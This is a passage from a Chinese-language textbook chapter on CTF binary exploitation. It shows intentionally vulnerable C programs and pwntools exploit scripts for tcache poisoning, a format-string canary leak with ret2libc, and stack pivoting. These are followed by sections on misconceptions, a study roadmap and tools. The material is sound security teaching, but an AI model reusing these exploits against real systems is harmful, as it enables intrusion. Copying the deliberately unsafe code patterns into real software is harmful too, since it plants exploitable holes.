    printf("Index: "); scanf("%d", &idx);
    if (idx >= 0 && idx < 10) {
        free(chunks[idx]);
        // 漏洞：没有将chunks[idx]置为NULL，存在UAF
    }
}

void show() {
    int idx;
    printf("Index: "); scanf("%d", &idx);
    if (idx >= 0 && idx < 10) {
        printf("%s\n", chunks[idx]);
    }
}

int main() {
    while (1) {
        printf("1. Alloc\n2. Delete\n3. Show\n> ");
        int choice;
        scanf("%d", &choice);
        switch (choice) {
            case 1: alloc(); break;
            case 2: delete(); break;
            case 3: show(); break;
            default: return 0;
        }
    }
}
```

### 利用过程（Tcache Poisoning + 覆写__free_hook）

```python
from pwn import *

p = process('./vuln4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

# 1. 分配两个chunk，释放后利用UAF泄露libc地址
alloc(0, 0x410, b'A' * 8)     # large chunk，不会进入tcache
alloc(1, 0x10, b'B' * 8)      # 防止与top chunk合并

delete(0)                       # chunk 0进入unsorted bin
show(0)                         # UAF：泄露fd/bk（main_arena地址）

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - 0x1ecbe0  # main_arena + 96的偏移（实际值需要调试确定）
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info(f"libc base: {hex(libc_base)}")

# 2. Tcache poisoning覆写__free_hook
alloc(2, 0x20, b'C' * 8)      # 分配tcache大小的chunk
alloc(3, 0x20, b'D' * 8)

delete(2)                       # 进入tcache
delete(3)                       # 进入tcache

# 利用UAF修改chunk 3的fd指针
# 需要一个写原语来修改fd（这里假设通过某种方式）
alloc(4, 0x20, p64(free_hook))  # 覆写chunk 3的fd

alloc(5, 0x20, b'E' * 8)       # 消费一个tcache条目
alloc(6, 0x20, p64(system_addr))  # 写入__free_hook！

# 3. 触发system("/bin/sh")
alloc(7, 0x20, b'/bin/sh\x00')
delete(7)                       # free(chunk7) -> system("/bin/sh")

p.interactive()
```

***
## 案例五：Format String + Stack Overflow组合利用

### 漏洞程序

```c
// vuln5.c
#include <stdio.h>

int secret = 0;

void vuln() {
    char buffer[256];
    printf("Enter name: ");
    read(0, buffer, 256);
    printf(buffer);  // 格式化字符串漏洞
    printf("\nEnter greeting: ");
    gets(buffer);    // 栈溢出漏洞
}

int main() {
    vuln();
    return 0;
}
```

### 利用思路

1. 利用格式化字符串漏洞泄露栈上的Canary值和libc地址
2. 利用栈溢出构造ret2libc payload

```python
from pwn import *

p = process('./vuln5')
elf = ELF('./vuln5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 第一步：利用格式化字符串泄露信息
# 在x64下，格式化字符串的参数从第6个开始在栈上
# 通过%p可以泄露栈上的值

p.sendafter(b'name: ', b'%11$p.%15$p')  # 泄露Canary和返回地址
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
log.info(f"Canary: {hex(canary)}")

p.recvuntil(b'0x')
ret_addr = int(p.recv(16), 16)
log.info(f"Return addr: {hex(ret_addr)}")

# 计算libc基地址
libc_base = ret_addr - libc.symbols['__libc_start_main'] - 243  # 实际偏移需要调试
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 第二步：栈溢出ret2libc
pop_rdi = 0x4012a3  # 需要用ROPgadget查找
payload = b'A' * 264      # buffer + padding到canary
payload += p64(canary)     # 保持canary
payload += p64(0)          # saved rbp
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendafter(b'greeting: ', payload)
p.interactive()
```

***
## 案例六：ROP链 + 栈迁移

### 场景描述

当栈空间不足以容纳完整的ROP链时，可以将栈迁移到BSS段或堆上。

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# 假设只有很小的溢出空间（如偏移只有8字节）
# 无法在栈上布置完整的ROP链

# 解决方案：栈迁移
leave_ret = 0x401234    # leave; ret gadget
bss_addr = 0x404800     # BSS段上一个可写的地址（需要对齐到16字节）

# 第一步：在BSS上布置完整的ROP链
# 利用其他漏洞（如格式化字符串）先将ROP链写到BSS上

# 第二步：通过栈溢出触发栈迁移
payload = p64(bss_addr) + p64(leave_ret)  # 覆盖saved RBP和返回地址
# leave: mov rsp, rbp (rsp = bss_addr); pop rbp
# ret: 跳转到BSS上布置的ROP链

p.send(payload)
p.interactive()
```

这些案例覆盖了PWN中最常见的利用场景，从最简单的栈溢出到堆利用和组合利用技术。掌握这些案例的思路后，可以举一反三应对更复杂的挑战。


***
# 第16章 二进制安全PWN — 常见误区

## 误区一：PWN只需要会写EXP

**错误认知：** 很多初学者认为PWN就是写exploit，只要学会用pwntools就够了。

**正确理解：** 写EXP只是PWN的最后一步。在此之前，你需要：
- 静态分析（IDA Pro反汇编）理解程序逻辑
- 动态调试（GDB/pwndbg）验证漏洞假设
- 识别漏洞类型并评估可利用性
- 设计利用方案（绕过各种防护机制）
- 最后才是编写EXP

真正的核心能力是漏洞分析和利用思路设计，而非工具使用。很多CTF题目考察的也是你的分析能力，而非简单的模板套用。

## 误区二：只要溢出就能Get Shell

**错误认知：** 发现栈溢出就一定能获得shell。

**正确理解：** 现代系统默认开启多种防护机制：
- **Canary**：溢出会被检测到，程序直接终止
- **NX**：栈不可执行，无法注入shellcode
- **ASLR**：不知道libc和栈的地址
- **PIE**：不知道程序本身的地址
- **Full RELRO**：GOT表不可写

每种防护都需要专门的绕过技术。一个简单的栈溢出在现代防护下可能完全不可利用，除非程序中存在信息泄露等辅助漏洞。

## 误区三：堆利用一定比栈溢出难

**错误认知：** 堆利用技术太复杂，初学者不应该碰。

**正确理解：** 
- glibc 2.26引入tcache后，很多堆利用变得非常简单（tcache poisoning本质上就是修改一个指针）
- 有些堆利用反而比栈溢出更容易，因为堆上的数据结构更多、利用面更广
- 建议的学习顺序是：栈溢出 → ret2libc → ROP → 堆基础 → tcache → 高级堆利用

## 误区四：只会一种架构就够了

**错误认知：** 只学x86就够了，其他架构不重要。

**正确理解：** 现实世界的漏洞存在于各种架构中：
- **ARM**：移动设备（Android、iOS）、嵌入式设备、IoT
- **MIPS**：路由器、嵌入式设备
- **RISC-V**：新兴架构，逐渐普及
- **PowerPC**：部分服务器和嵌入式系统

不同架构的寄存器、调用约定、指令集都不同，但利用原理是相通的。建议先精通x86/x64，再扩展到ARM等其他架构。

## 误区五：libc版本不重要

**错误认知：** 只要知道libc基地址就够了，不需要关心具体版本。

**正确理解：** libc版本对PWN至关重要：
- 不同版本的libc中函数偏移不同
- 堆管理器的行为和安全检查在不同版本间差异很大（如tcache在2.26引入，tcache key在2.29引入，safe linking在2.32引入）
- one_gadget的约束条件因版本而异
- 某些利用技术只在特定版本下有效

在做题或实战中，确定libc版本是第一步。常用方法：泄露某个函数地址，通过libc database（如libc.blukat.me）查询版本。

## 误区六：盲目背诵利用模板

**错误认知：** 背熟各种利用模板（House of XXX、ret2XXX），遇到题目直接套用。

**正确理解：** 
- 模板只是参考，实际利用需要根据具体情况调整
- 每个程序的漏洞位置、可用空间、防护配置都不同
- 真正的能力是理解利用原理后能够灵活变通
- CTF出题者经常会故意构造让模板失效的场景

建议：学习每种技术时，理解其"为什么有效"和"在什么条件下有效"，而非死记硬背步骤。

## 误区七：不需要学操作系统底层知识

**错误认知：** PWN只需要学漏洞利用技术，不需要了解操作系统。

**正确理解：** PWN深度依赖操作系统知识：
- 进程的内存布局（ASLR、mmap、brk）
- 系统调用机制（syscall、int 0x80）
- 信号处理机制（SROP利用的基础）
- 动态链接机制（PLT/GOT、延迟绑定）
- 文件描述符和IO缓冲

不了解这些底层机制，你永远只能停留在套模板的阶段。

## 误区八：只在本地调试就够了

**错误认知：** 本地能打通就行了，远程环境都一样。

**正确理解：** 本地和远程可能存在差异：
- libc版本不同（本地用系统的libc，远程可能用题目提供的）
- ASLR的随机熵可能不同
- 网络延迟可能导致交互时序问题
- 缓冲区大小在不同环境下可能有细微差异（栈对齐）

始终建议使用题目提供的libc和ld进行本地调试，确保环境一致。

## 误区九：二进制安全只和CTF有关

**错误认知：** PWN只是CTF竞赛的技术，现实世界用不到。

**正确理解：** PWN在现实世界中极为重要：
- 软件漏洞挖掘和利用是安全研究的核心领域
- 恶意软件分析需要理解漏洞利用技术
- 漏洞赏金计划（Bug Bounty）中二进制漏洞奖励极高
- APT攻击中大量使用二进制漏洞利用链
- 安全产品的开发和测试也需要PWN知识

## 误区十：忽略自动化和效率

**错误认知：** 手动调试和分析就够了，不需要自动化工具。

**正确理解：** 
- 在CTF竞赛中，时间是关键因素，快速编写和调试EXP至关重要
- 在实际漏洞研究中，可能需要处理大量的崩溃样本（fuzzing结果）
- 使用pwntools、pwndbg、one_gadget等工具可以大幅提升效率
- 建立自己的工具库和模板，遇到类似问题可以快速复用

效率工具推荐：
- **pwndbg**：GDB增强插件，提供堆分析、内存搜索等功能
- **pwntools**：Python漏洞利用框架
- **one_gadget**：查找libc中的one gadget
- **libc-database**：libc版本识别
- **seccomp-tools**：分析沙箱规则


***
# 第16章 二进制安全PWN — 练习方法

## 学习路线图

### 第一阶段：基础夯实（2-4周）

**目标：** 掌握PWN的基本概念和最简单的栈溢出利用。

**学习内容：**
1. 复习C语言指针和内存管理
2. 学习x86/x64汇编基础（能读懂反汇编代码）
3. 安装并熟悉Linux环境、GCC编译选项
4. 学习GDB基本操作（断点、查看寄存器、查看内存）
5. 理解栈帧结构和函数调用过程

**练习题目：**
- CTFHub：栈溢出基础题
- BUUCTF：pwn01-pwn05（基础栈溢出）
- 自己编译带调试信息的程序，用GDB单步跟踪

**环境搭建：**
```bash
# 安装必要工具
sudo apt install gcc gdb python3 pip
pip install pwntools
pip install ropper  # 或安装ROPgadget

# 安装pwndbg（GDB增强插件）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 安装LibcSearcher
pip install LibcSearcher
```

### 第二阶段：ret2libc与ROP（2-4周）

**目标：** 掌握绕过NX和ASLR的技术。

**学习内容：**
1. ret2libc原理和实践
2. ROP链构造
3. ret2csu通用gadgets
4. 使用ROPgadget搜索gadgets
5. PLT/GOT机制和ret2plt

**练习题目：**
- BUUCTF：ciscn_2019_c_1, ciscn_2019_n_1, pwn2_sctf_2016
- 攻防世界：进阶区pwn题
- CTFHub：ret2libc分类题目

**关键练习：**
```bash
# 练习使用ROPgadget
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary libc.so.6 --string "/bin/sh"

# 练习使用one_gadget
one_gadget libc.so.6

# 练习使用pwntools自动化
python3 -c "from pwn import *; print(p64(0xdeadbeef))"
```

### 第三阶段：Canary绕过与高级栈利用（2-3周）

**目标：** 掌握绕过Canary保护和格式化字符串漏洞利用。

**学习内容：**
1. Canary的原理和绕过方法
2. 格式化字符串漏洞读写
3. 格式化字符串+栈溢出组合利用
4. 栈迁移技术

**练习题目：**
- BUUCTF：ciscn_2019_en_2, ciscn_2019_ne_5
- 攻防世界：格式化字符串分类
- 自行编译带Canary的程序练习泄露Canary

### 第四阶段：堆利用入门（3-4周）

**目标：** 理解堆管理器原理，掌握基本堆利用技术。

**学习内容：**
1. ptmalloc2核心数据结构
2. malloc/free的详细流程
3. Fast bin attack
4. Unsorted bin attack
5. Tcache poisoning（glibc 2.26+）
6. 使用pwndbg的heap命令调试堆

**练习题目：**
- BUUCTF：ciscn_2019_n_8, hitcontraining_uaf
- 攻防世界：堆利用相关题目
- 自己编写存在堆漏洞的程序并利用

**堆调试练习：**
```bash
# 在GDB中使用pwndbg查看堆
pwndbg> heap
pwndbg> bins
pwndbg> vis_heap_chunks
pwndbg> malloc_chunk 0x555555602010
```

### 第五阶段：高级堆利用（3-4周）

**目标：** 掌握更复杂的堆利用技术和House系列。

**学习内容：**
1. House of Force
2. House of Spirit
3. House of Lore
4. House of Einherjar（off-by-null利用）
5. Large bin attack
6. Tcache stashing unlink attack
7. 不同glibc版本的差异和安全检查

**练习题目：**
- 各CTF平台的堆利用进阶题
- 历年国赛、省赛pwn题

### 第六阶段：综合提升（持续）

**目标：** 能够独立分析和利用复杂的二进制漏洞。

**学习内容：**
1. 学习其他架构（ARM、MIPS）的PWN
2. Kernel PWN基础
3. 沙箱逃逸技术
4. 真实软件漏洞分析
5. 参加CTF比赛积累经验

## 推荐练习平台

### 入门级
- **CTFHub** (ctfhub.com)：提供分类明确的入门题目，有详细解题报告
- **BUUCTF** (buuoj.cn)：国内最大的CTF练习平台，题目丰富
- **pwnable.kr**：经典的PWN入门平台，循序渐进

### 中级
- **攻防世界** (adworld.xctf.org.cn)：提供不同难度的题目
- **Hack The Box**：提供真实的渗透测试环境
- **pwnable.tw**：台湾的PWN练习平台，题目质量高

### 高级
- **CTFtime** (ctftime.org)：全球CTF赛事日历，参加比赛是最好的练习
- **0CTF/TCTF**：顶级CTF赛事，题目极具挑战性
- **Real World CTF**：侧重真实世界漏洞的CTF赛事

## 推荐学习资源

### 书籍
- 《CTF竞赛权威指南（PWN篇）》— FlappyPig战队
- 《程序员的自我修养—链接、装载与库》— 俞甲子等
- 《深入理解计算机系统》（CSAPP）— Randal E. Bryant

### 在线课程
- Cybrary的PWN相关课程
- 看雪学院的二进制安全课程
- 各大安全社区的免费教程

### 博客和社区
- CTF Wiki (ctf-wiki.org)：系统的CTF知识库
- 看雪论坛 (kanxue.com)：国内顶级安全社区
- 安全客 (anquanke.com)：安全资讯和技术文章

## 日常练习建议

1. **每天至少做一道PWN题**：保持手感比突击学习更有效
2. **写解题报告**：每道题做完后写详细的解题报告，整理利用思路
3. **复盘经典题目**：定期回顾之前做过的题目，尝试用不同的方法解题
4. **参加CTF比赛**：比赛是最好的学习环境，能在压力下快速提升
5. **阅读他人WP**：学习他人的解题思路和技巧
6. **搭建自己的工具库**：整理常用的脚本、gadgets、模板

## 调试技巧

1. **使用GDB+pwndbg**：调试堆题目时pwndbg的heap命令非常有用
2. **使用pwntools的gdb.attach()**：在交互式题目中附加调试器
3. **core dump分析**：当程序崩溃时，分析core dump确定崩溃原因
4. **strace/ltrace跟踪**：跟踪系统调用和库函数调用
5. **LD_PRELOAD劫持**：使用自定义的libc进行测试


***
# 第16章 二进制安全PWN — 本章小结

## 核心知识点回顾

### 1. 计算机体系结构
本章首先介绍了PWN所需的基础知识。x86/x64架构的寄存器（特别是EIP/RIP、ESP/RSP、EBP/RBP）是理解栈溢出的关键。调用约定（cdecl、System V AMD64 ABI）决定了函数参数如何传递、返回地址如何存放。系统调用机制（int 0x80、syscall）是构造execve shellcode的基础。

### 2. 内存管理
程序内存布局（代码段、数据段、堆、栈）是理解漏洞利用的前提。栈帧结构和函数调用流程是栈溢出利用的理论基础。堆管理器（ptmalloc2）的bin机制、chunk结构、malloc/free流程是堆利用的核心。

### 3. 漏洞类型
本章系统介绍了栈溢出、堆溢出、格式化字符串、整数溢出、UAF、Double Free、类型混淆等常见内存安全漏洞。每种漏洞都有其特定的成因和利用方式。

### 4. 安全防护
栈Canary、ASLR、NX/DEP、PIE、RELRO、CFI等防护机制构成了现代系统的安全防线。理解每种防护的原理是学习绕过技术的前提。

### 5. 利用技术
- **栈溢出利用**：基本覆盖返回地址、shellcode注入、ret2libc、ret2plt
- **ROP技术**：基本ROP链、ret2csu、ret2syscall、SROP
- **堆利用**：fast bin attack、unsorted bin attack、tcache poisoning、House系列
- **高级技术**：栈迁移、格式化字符串读写、Canary绕过

## 技术要点

1. **确定偏移**是所有利用的第一步，使用cyclic pattern可以高效定位
2. **信息泄露**是绕过ASLR的关键，大多数题目都需要先泄露地址
3. **libc版本**直接影响利用方案，务必确定目标的libc版本
4. **堆利用的核心**是控制空闲chunk的指针（fd/fd_nextsize），使malloc返回攻击者指定的地址
5. **工具链**（pwntools、GDB+pwndbg、ROPgadget、one_gadget）是提高效率的关键

## 学习建议

PWN是一个需要大量实践的方向。理论知识只是基础，真正的提升来自于：
- 大量做题积累经验
- 动手调试理解底层细节
- 阅读他人WP学习新思路
- 参加CTF比赛检验水平

建议按照本章提供的学习路线，从基础栈溢出开始，逐步攻克各个难点。每掌握一个新技术，都通过做题来巩固。不要急于求成，PWN的学习曲线确实陡峭，但突破后的成就感也是无与伦比的。

## 进阶方向

掌握本章内容后，可以向以下方向深入：
- **Kernel PWN**：Linux内核漏洞利用
- **Browser PWN**：浏览器漏洞利用（V8、SpiderMonkey）
- **VM PWN**：虚拟机逃逸（QEMU、VMware）
- **ARM/MIPS PWN**：移动端和嵌入式设备的漏洞利用
- **漏洞挖掘**：Fuzzing、符号执行等自动化漏洞发现技术
